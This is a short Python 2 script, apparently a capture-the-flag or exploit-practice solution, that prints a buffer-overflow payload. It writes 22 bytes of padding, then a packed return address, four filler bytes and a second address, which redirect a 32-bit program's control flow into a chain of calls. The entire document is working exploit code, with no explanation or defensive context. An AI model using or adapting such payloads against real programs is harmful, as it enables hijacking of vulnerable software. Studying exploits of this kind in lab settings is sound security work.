from struct import pack

toRet1 = 0x804ef50
toRet2 = 0x80bc8e0

print "A"*22 + pack("<I", toRet1) + "A"*4 + pack("<I", toRet2)